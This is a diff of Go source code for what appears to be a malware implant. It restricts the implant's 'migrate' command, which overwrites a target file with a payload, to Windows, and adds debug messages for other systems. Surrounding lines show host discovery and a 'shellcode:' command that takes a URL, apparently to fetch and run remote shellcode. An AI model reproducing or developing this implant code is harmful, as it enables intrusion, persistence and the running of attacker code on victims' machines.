@@ -1798,16 +1798,28 @@ func main() {
                         discoverLocalHosts(lazyconf)
                     })
                 case strings.HasPrefix(command, "migrate:"):
-                    rest := strings.TrimPrefix(command, "migrate:")
-                    parts := strings.SplitN(rest, ",", 2)  // Máximo 2 partes
+                    osName := runtime.GOOS
+                    switch osName {
+                    case "windows":
+                        rest := strings.TrimPrefix(command, "migrate:")
+                        parts := strings.SplitN(rest, ",", 2)  // Máximo 2 partes
 
-                    targetPath := strings.TrimSpace(parts[0])
-                    var payloadPath string
-                    if len(parts) > 1 {
-                        payloadPath = strings.TrimSpace(parts[1])
+                        targetPath := strings.TrimSpace(parts[0])
+                        var payloadPath string
+                        if len(parts) > 1 {
+                            payloadPath = strings.TrimSpace(parts[1])
+                        }
+
+                        go overWrite(targetPath, payloadPath)
+                     case "linux", "darwin":
+                        if lazyconf.DebugImplant == "True" {
+                                fmt.Println("migrate is not implemented in linux/darwin systems.")
+                        }
+                    default:
+                        if lazyconf.DebugImplant == "True" {
+                            fmt.Println("migrate is not implemented in this system.")
+                        }
                     }
-
-                    go overWrite(targetPath, payloadPath)
                     
                 case strings.HasPrefix(command, "shellcode:"):
                     url := strings.TrimPrefix(command, "shellcode:")
